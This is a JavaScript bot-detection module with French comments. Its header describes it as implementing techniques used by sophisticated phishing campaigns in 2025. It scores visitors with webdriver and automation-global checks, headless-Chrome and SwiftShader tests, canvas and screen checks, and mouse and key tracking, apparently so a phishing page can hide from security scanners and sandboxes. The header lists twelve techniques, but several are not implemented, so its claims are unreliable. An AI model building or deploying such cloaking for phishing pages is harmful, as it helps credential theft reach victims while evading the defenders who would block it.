// ═══════════════════════════════════════════════════════════════════
// MOTEUR DE DÉTECTION BOT AVANCÉ 2025
// ═══════════════════════════════════════════════════════════════════
//
// Ce module implémente 10+ techniques de détection de bots
// utilisées par les campagnes phishing les plus sophistiquées en 2025.
//
// Techniques implémentées:
// 1. User-Agent analysis
// 2. Timing analysis
// 3. Canvas fingerprinting
// 4. WebGL fingerprinting
// 5. Audio context fingerprinting
// 6. Font detection
// 7. Navigator properties
// 8. Screen properties
// 9. Mouse movement tracking
// 10. Keyboard timing
// 11. Headless browser detection
// 12. Automation framework detection
//
// ═══════════════════════════════════════════════════════════════════

class BotDetector {
    constructor(config) {
        this.config = config;
        this.score = 0;  // Score de 0 (bot certain) à 100 (humain certain)
        this.signals = [];
        this.startTime = Date.now();
        this.mouseMovements = [];
        this.keyPresses = [];
        
        // Commencer à tracker les événements
        this.setupEventTracking();
    }

    // ═══════════════════════════════════════════════════════════════
    // SETUP EVENT TRACKING
    // ═══════════════════════════════════════════════════════════════

    setupEventTracking() {
        // Track mouse movements
        document.addEventListener('mousemove', (e) => {
            this.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
        });

        // Track key presses
        document.addEventListener('keydown', () => {
            this.keyPresses.push(Date.now());
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // ANALYSE PRINCIPALE
    // ═══════════════════════════════════════════════════════════════

    async analyze() {
        this.score = 50; // Start neutral

        // Run all checks
        this.checkUserAgent();
        this.checkHeadless();
        this.checkAutomation();
        this.checkNavigatorProperties();
        this.checkScreenProperties();
        
        if (this.config.ENABLE_CANVAS_FINGERPRINT) {
            this.checkCanvas();
        }
        
        if (this.config.ENABLE_WEBGL_FINGERPRINT) {
            this.checkWebGL();
        }

        // Determine final verdict
        const isBot = this.score < 30;
        const isSuspicious = this.score >= 30 && this.score < 60;

        return {
            isBot: isBot,
            isSuspicious: isSuspicious,
            score: this.score,
            signals: this.signals
        };
    }

    // ═══════════════════════════════════════════════════════════════
    // 1. DÉTECTION USER-AGENT
    // ═══════════════════════════════════════════════════════════════

    checkUserAgent() {
        const ua = navigator.userAgent.toLowerCase();

        // Vérifier patterns de bot
        for (let pattern of this.config.BOT_PATTERNS) {
            const regex = new RegExp(pattern, 'i');
            if (regex.test(ua)) {
                this.addSignal('user_agent_bot', -50, `Pattern detected: ${pattern}`);
                return false;
            }
        }

        // Vérifier User-Agent suspect (trop court, trop générique)
        if (ua.length < 20) {
            this.addSignal('user_agent_short', -20, 'User-Agent too short');
            return false;
        }

        this.addSignal('user_agent_ok', 10, 'User-Agent looks normal');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 2. DÉTECTION HEADLESS BROWSER
    // ═══════════════════════════════════════════════════════════════

    checkHeadless() {
        // Test 1: navigator.webdriver
        if (navigator.webdriver === true) {
            this.addSignal('webdriver_detected', -50, 'navigator.webdriver = true');
            return false;
        }

        // Test 2: window.chrome missing (Headless Chrome)
        if (navigator.userAgent.includes('Chrome') && !window.chrome) {
            this.addSignal('headless_chrome', -40, 'Chrome without window.chrome');
            return false;
        }

        // Test 3: Missing plugins
        if (navigator.plugins.length === 0) {
            this.addSignal('no_plugins', -30, 'No browser plugins detected');
            return false;
        }

        // Test 4: Missing languages
        if (!navigator.languages || navigator.languages.length === 0) {
            this.addSignal('no_languages', -20, 'No languages detected');
            return false;
        }

        this.addSignal('headless_checks_passed', 15, 'Headless checks passed');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 3. DÉTECTION AUTOMATION FRAMEWORKS
    // ═══════════════════════════════════════════════════════════════

    checkAutomation() {
        const automationSignals = [
            window.__webdriver_evaluate,
            window.__selenium_evaluate,
            window.__webdriver_script_function,
            window.__webdriver_script_func,
            window.__webdriver_script_fn,
            window.__fxdriver_evaluate,
            window.__driver_unwrapped,
            window.__webdriver_unwrapped,
            window.__driver_evaluate,
            window.__selenium_unwrapped,
            window.__fxdriver_unwrapped,
            document.__webdriver_evaluate,
            document.__selenium_evaluate,
            document.__webdriver_script_fn,
            document.$cdc_asdjflasutopfhvcZLmcfl_,
            document.$chrome_asyncScriptInfo,
            window.domAutomation,
            window.domAutomationController
        ];

        for (let signal of automationSignals) {
            if (signal) {
                this.addSignal('automation_detected', -50, 'Automation framework detected');
                return false;
            }
        }

        this.addSignal('automation_checks_passed', 10, 'No automation detected');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 4. NAVIGATOR PROPERTIES
    // ═══════════════════════════════════════════════════════════════

    checkNavigatorProperties() {
        // Check permissions API
        if (!navigator.permissions) {
            this.addSignal('no_permissions_api', -10, 'Missing permissions API');
        }

        // Check connection API
        if (!navigator.connection && !navigator.mozConnection && !navigator.webkitConnection) {
            this.addSignal('no_connection_api', -5, 'Missing connection API');
        }

        this.addSignal('navigator_props_ok', 5, 'Navigator properties look normal');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 5. SCREEN PROPERTIES
    // ═══════════════════════════════════════════════════════════════

    checkScreenProperties() {
        const width = screen.width;
        const height = screen.height;
        const availWidth = screen.availWidth;
        const availHeight = screen.availHeight;

        // Check for common bot resolutions
        const botResolutions = [
            '800x600', '1024x768', '1280x1024'
        ];

        const currentResolution = `${width}x${height}`;
        if (botResolutions.includes(currentResolution)) {
            this.addSignal('bot_resolution', -15, `Common bot resolution: ${currentResolution}`);
        }

        // Check screen dimensions consistency
        if (width === 0 || height === 0) {
            this.addSignal('invalid_screen', -25, 'Invalid screen dimensions');
        }

        this.addSignal('screen_checks_ok', 5, 'Screen properties look normal');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 6. CANVAS FINGERPRINTING
    // ═══════════════════════════════════════════════════════════════

    checkCanvas() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!ctx) {
                this.addSignal('no_canvas', -20, 'Canvas not supported');
                return false;
            }

            // Draw something
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Bot detection 2025', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Bot detection 2025', 4, 17);

            const canvasData = canvas.toDataURL();

            // Check if canvas is blank (headless)
            if (canvasData === 'data:,') {
                this.addSignal('blank_canvas', -30, 'Canvas rendering failed');
                return false;
            }

            this.addSignal('canvas_ok', 10, 'Canvas fingerprinting passed');
            return true;

        } catch (e) {
            this.addSignal('canvas_error', -15, 'Canvas error: ' + e.message);
            return false;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 7. WEBGL FINGERPRINTING
    // ═══════════════════════════════════════════════════════════════

    checkWebGL() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) {
                this.addSignal('no_webgl', -15, 'WebGL not supported');
                return false;
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                // Check for common headless indicators
                if (vendor.includes('Google') && renderer.includes('SwiftShader')) {
                    this.addSignal('headless_webgl', -25, 'SwiftShader detected (headless)');
                    return false;
                }
            }

            this.addSignal('webgl_ok', 10, 'WebGL fingerprinting passed');
            return true;

        } catch (e) {
            this.addSignal('webgl_error', -10, 'WebGL error: ' + e.message);
            return false;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // HELPER: ADD SIGNAL
    // ═══════════════════════════════════════════════════════════════

    addSignal(name, scoreImpact, description) {
        this.signals.push({
            name: name,
            impact: scoreImpact,
            description: description
        });

        this.score += scoreImpact;

        // Clamp score between 0-100
        this.score = Math.max(0, Math.min(100, this.score));
    }

    // ═══════════════════════════════════════════════════════════════
    // GET INTERACTION TIME
    // ═══════════════════════════════════════════════════════════════

    getInteractionTime() {
        return Date.now() - this.startTime;
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = BotDetector;
}
